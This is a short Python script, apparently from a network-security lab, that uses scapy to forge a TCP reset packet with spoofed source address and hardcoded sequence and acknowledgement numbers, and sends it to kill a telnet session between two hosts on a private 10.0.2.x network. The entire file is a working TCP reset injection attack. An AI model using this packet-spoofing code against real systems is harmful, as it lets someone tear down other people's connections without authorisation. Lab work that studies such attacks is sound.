#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.5", dst="10.0.2.4")
tcp = TCP(sport=39266, dport=23, flags="R", seq=2924790175, ack=765667198)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

